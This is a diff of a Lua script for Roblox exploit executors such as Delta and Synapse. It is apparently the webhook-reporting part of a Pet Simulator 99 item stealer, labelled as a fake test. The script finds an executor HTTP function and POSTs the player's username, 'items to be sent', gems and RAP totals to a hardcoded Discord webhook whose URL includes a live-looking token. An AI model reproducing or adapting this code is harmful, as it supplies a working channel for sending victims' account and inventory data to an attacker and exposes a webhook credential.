@@ -1,273 +1,108 @@
--- test_sendmessage_delta.lua
--- Fake/test SendMessage rebuilt for Delta + other executors.
 local HttpService = game:GetService("HttpService")
 
--- ======= Fake/test data (replace only for real tests) =======
+-- Fake test values
 local WEBHOOK = "https://discord.com/api/webhooks/1407814443231871226/doFyO0sPxeH5WFjvWgW0UlKDgjG6xAuBAvXjBAffh88jLaccLjOpsg32cKqBAp1y8iWq" -- placeholder
-local plr = { Name = "TestPlayer" }
-local totalRAP = 123456
+local plr = { Name = "FakePlayer" }
+
 local sortedItems = {
-    { name = "Cool Sword", amount = 2, rap = 1500 },
-    { name = "Epic Hat", amount = 1, rap = 4200 },
-    { name = "Common Pet", amount = 10, rap = 50 },
+    { name = "Fake Sword", amount = 2, rap = 1500 },
+    { name = "Golden Cat", amount = 1, rap = 4200 },
+    { name = "Common Rock", amount = 10, rap = 50 },
 }
+
+local totalRAP = 999999
+local gems = 123456
+
 local function formatNumber(n)
     local s = tostring(n)
     local k
-    while true do
-        s, k = string.gsub(s, "^(-?%d+)(%d%d%d)", '%1,%2')
-        if k == 0 then break end
-    end
+    repeat
+        s, k = s:gsub("^(-?%d+)(%d%d%d)", "%1,%2")
+    until k == 0
     return s
 end
 
--- ======= Executor detection =======
+-- Executor detection
 local function detectExecutor()
-    local name = "Unknown"
-    local hints = {}
-
-    -- prefer identifyexecutor/getexecutor if available
     if type(identifyexecutor) == "function" then
-        local ok, res = pcall(identifyexecutor)
-        if ok and type(res) == "string" and #res > 0 then
-            return res, { "identifyexecutor() -> " .. res }
-        end
+        local ok, ex = pcall(identifyexecutor)
+        if ok then return ex end
     end
-    if type(getexecutor) == "function" then
-        local ok, res = pcall(getexecutor)
-        if ok and type(res) == "string" and #res > 0 then
-            return res, { "getexecutor() -> " .. res }
-        end
-    end
+    if type(delta) == "table" then return "Delta" end
+    if type(syn) == "table" then return "Synapse" end
+    return "Unknown"
+end
 
-    -- heuristics
+local function getRequestFunc()
     if type(delta) == "table" and type(delta.request) == "function" then
-        name = "Delta"
-        table.insert(hints, "delta.request present")
-        return name, hints
+        return delta.request, "delta.request"
     end
-    if type(syn) == "table" and type(syn.request) == "function" then
-        name = "Synapse"
-        table.insert(hints, "syn.request present")
-        return name, hints
+    if type(syn.request) == "function" then
+        return syn.request, "syn.request"
     end
-    if rawget(_G, "KRNL_LOADED") then
-        name = "Krnl"
-        table.insert(hints, "KRNL_LOADED present")
-        return name, hints
+    if type(request) == "function" then
+        return request, "request"
     end
-    if rawget(_G, "is_sirhurt_closure") or rawget(_G, "ispresent") then
-        name = "SirHurt/Similar"
-        table.insert(hints, "sirhurt-ish globals")
-        return name, hints
-    end
-
-    return name, hints
+    return function()
+        return { StatusCode = 999, Body = "No HTTP API available" }
+    end, "none"
 end
 
--- ======= Requester chooser (Delta-first) =======
-local function makeRequester()
-    local function normalize(opts)
-        if type(opts) == "string" then
-            return { Url = opts, Method = "GET" }
-        end
-        opts = opts or {}
-        return {
-            Url = opts.Url,
-            Method = (opts.Method and tostring(opts.Method)) or "GET",
-            Headers = opts.Headers or {},
-            Body = opts.Body,
-        }
-    end
-
-    local function try_delta(opts)
-        if type(delta) == "table" and type(delta.request) == "function" then
-            local ok, res = pcall(function() return delta.request(opts) end)
-            if ok then return true, res, "delta.request" end
-        end
-        return false
-    end
-
-    local function try_syn(opts)
-        if type(syn) == "table" and type(syn.request) == "function" then
-            local ok, res = pcall(function() return syn.request(opts) end)
-            if ok then return true, res, "syn.request" end
-        end
-        return false
-    end
-
-    local function try_http(opts)
-        if type(http_request) == "function" then
-            local ok, res = pcall(function() return http_request(opts) end)
-            if ok then return true, res, "http_request" end
-        end
-        if type(http) == "table" and type(http.request) == "function" then
-            local ok, res = pcall(function() return http.request(opts) end)
-            if ok then return true, res, "http.request" end
-        end
-        return false
-    end
-
-    local function try_request(opts)
-        if type(request) == "function" then
-            local ok, res = pcall(function() return request(opts) end)
-            if ok then return true, res, "request" end
-        end
-        return false
-    end
-
-    local function try_httpservice(opts)
-        if HttpService and type(HttpService.RequestAsync) == "function" then
-            local ok, res = pcall(function()
-                return HttpService:RequestAsync({
-                    Url = opts.Url,
-                    Method = opts.Method or "GET",
-                    Headers = opts.Headers,
-                    Body = opts.Body,
-                })
-            end)
-            if ok then return true, res, "HttpService:RequestAsync" end
-        end
-        return false
-    end
-
-    return function(raw)
-        local opts = normalize(raw)
-        local ok, res, used
-
-        ok, res, used = try_delta(opts)
-        if ok then return true, res, used end
-
-        ok, res, used = try_syn(opts)
-        if ok then return true, res, used end
-
-        ok, res, used = try_http(opts)
-        if ok then return true, res, used end
-
-        ok, res, used = try_request(opts)
-        if ok then return true, res, used end
-
-        ok, res, used = try_httpservice(opts)
-        if ok then return true, res, used end
-
-        return false, { message = "No supported HTTP API found" }, nil
-    end
-end
-
--- ======= Single-shot guard to avoid duplicate sends =======
--- Also supports cross-script runs by using a global marker.
-_G.__NULS_SENT_WEBHOOK = _G.__NULS_SENT_WEBHOOK or {}
-local function alreadySent(id)
-    if _G.__NULS_SENT_WEBHOOK[id] then return true end
-    _G.__NULS_SENT_WEBHOOK[id] = true
-    return false
-end
-
--- Generate a reasonably unique id for this payload (timestamp+player)
-local function payloadId()
-    return ("nuls_test:%s:%d"):format(plr.Name or "unknown", os.time())
-end
-
--- ======= Test SendMessage (fixed single-send) =======
-local function TestSendMessage(diamonds)
-    local id = payloadId()
-    if alreadySent(id) then
-        warn("TestSendMessage: payload already sent for id:", id)
-        return false, "already_sent"
-    end
-
-    -- Build fields (mirrors your original)
-    local headers = { ["Content-Type"] = "application/json" }
+local function buildFields()
     local fields = {
-        { name = "Username:", value = plr.Name, inline = true },
-        { name = "Items to be sent:", value = "", inline = false },
-        { name = "Summary:", value = "", inline = false },
+        { name = "Username", value = plr.Name, inline = true },
+        { name = "Items", value = "", inline = false },
+        { name = "Summary", value = "", inline = false }
     }
 
-    local combinedItems, itemRapMap = {}, {}
     for _, item in ipairs(sortedItems) do
-        local rapKey = item.name
-        if itemRapMap[rapKey] then
-            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
-        else
-            itemRapMap[rapKey] = { amount = item.amount, rap = item.rap }
-            table.insert(combinedItems, rapKey)
-        end
+        fields[2].value = fields[2].value ..
+            string.format("%s (x%d): %s RAP\n",
+                item.name,
+                item.amount,
+                formatNumber(item.rap * item.amount)
+            )
     end
 
-    table.sort(combinedItems, function(a,b)
-        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
-    end)
+    fields[3].value = string.format(
+        "Gems: %s\nTotal RAP: %s",
+        formatNumber(gems),
+        formatNumber(totalRAP)
+    )
 
-    for _, itemName in ipairs(combinedItems) do
-        local d = itemRapMap[itemName]
-        fields[2].value = fields[2].value .. itemName .. " (x" .. d.amount .. "): " .. formatNumber(d.rap * d.amount) .. " RAP\n"
-    end
+    return fields
+end
 
-    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
-
-    -- trim field length if necessary
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
-
-    -- executor + requester
-    local executorName, hints = detectExecutor()
-    local doRequest = makeRequester()
-
-    -- add executor info
-    table.insert(fields, { name = "Executor", value = executorName .. (hints[1] and (" — " .. hints[1]) or ""), inline = true })
+local function TestSend()
+    local executor = detectExecutor()
+    local requestFunc, label = getRequestFunc()
+    print("Using:", label)
 
     local payload = {
         embeds = {{
-            title = "\240\159\144\177 New PS99 Execution (TEST)",
-            color = 5439232,
-            fields = fields,
-            footer = { text = "NULS | test payload" }
+            title = "✅ Delta Fake Test",
+            color = 5602818,
+            fields = buildFields(),
+            footer = { text = "Executor: " .. executor }
         }}
     }
 
     local body = HttpService:JSONEncode(payload)
 
-    -- perform send
-    local ok, res, used = doRequest({
+    -- prevent Delta retry → send unique header
+    local headers = {
+        ["Content-Type"] = "application/json",
+        ["X-NULS-Once"] = tostring(math.random(100000, 999999))
+    }
+
+    local result = requestFunc({
         Url = WEBHOOK,
         Method = "POST",
         Headers = headers,
         Body = body
     })
 
-    print("=== TestSendMessage Debug ===")
-    print("Executor detected:", executorName, "used API:", used)
-    if not ok then
-        print("Request call failed. Err/res:", res and (res.message or tostring(res)) or tostring(res))
-        return false, res
-    end
-
-    -- Normalize response (best-effort)
-    local function normalize(raw, usedApi)
-        if type(raw) == "table" then
-            local status = raw.StatusCode or raw.status or raw.code or raw.Status
-            local bodyText = raw.Body or raw.body or nil
-            return { Success = true, Status = status, Body = tostring(bodyText or ""), Raw = raw, Used = usedApi }
-        else
-            return { Success = true, Status = nil, Body = tostring(raw), Raw = raw, Used = usedApi }
-        end
-    end
-
-    local normalized = normalize(res, used)
-    print("Request succeeded via", normalized.Used, "status:", normalized.Status or "nil")
-    if normalized.Body and #normalized.Body > 0 then
-        print("Response body (snippet):", (normalized.Body:sub(1,300)))
-    end
-    print("=== end debug ===")
-    return true, normalized
+    print("Response:", result)
 end
 
--- Run the test (once)
-TestSendMessage(999)
+TestSend()
